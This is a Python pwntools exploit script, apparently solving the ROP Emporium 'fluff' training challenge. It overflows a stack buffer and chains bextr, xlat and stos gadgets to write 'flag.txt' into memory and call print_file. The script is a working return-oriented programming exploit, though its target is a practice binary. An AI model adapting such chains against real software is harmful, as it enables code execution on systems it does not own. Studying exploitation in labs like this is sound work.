#!/usr/bin/python3

from pwn import *

PROG_NAME = "./fluff"
p = process(PROG_NAME)
elf = p.elf

if args.ATTACH:
    gdb.attach(p, '''break main''')

data_addr = 0x00601028
mov_eax_0_pop_rbp_addr = 0x00400610     # mov eax, 0; pop rbp; ret;
pop_rdi_addr = 0x004006a3               # pop rdi; ret;

pop_rdx_rcx_bextr_rbx_addr = 0x0040062a # pop rdx; pop rcx; add rcx, 0x3ef2; bextr rbx, rcx, rdx; ret;
xlat_ptr_rbx_addr = 0x00400628          # xlat BYTE PTR ds:[rbx]
stos_ptr_rdi_al_addr = 0x00400639       # stos BYTE PTR es:[rdi],al

p.recvuntil(b'> ')
payload = b'A' * (0x20 + 0x8)

# only need to set al (eax) to 0 once
# and set rdi to our .data address once
payload += p64(mov_eax_0_pop_rbp_addr)
payload += p64(1337)
payload += p64(pop_rdi_addr)
payload += p64(data_addr)

al = 0 # start at zero after out `mov eax, 0`
for i, c in enumerate('flag.txt'):
    char_addr = next(elf.search(c.encode()))
    payload += p64(pop_rdx_rcx_bextr_rbx_addr)

    # 0x4000 = 0100 0000 0000 0000
    # bits 7:0 starting index to copy = 0
    # bits 15:8 number of bits to copy = 64
    payload += p64(0x4000)

    # magic number and al will get added to address later
    payload += p64(char_addr - 0x3ef2 - al)
    payload += p64(xlat_ptr_rbx_addr)
    payload += p64(stos_ptr_rdi_al_addr)
    al = ord(c)

    # at this point *(.data+i) = c,
    # and rdi is incremented for next loop thanks to `stos`

# with our .data set up, we can call print_file
payload += p64(pop_rdi_addr)
payload += p64(data_addr)
payload += p64(elf.symbols['print_file'])

p.sendline(payload)
p.interactive()
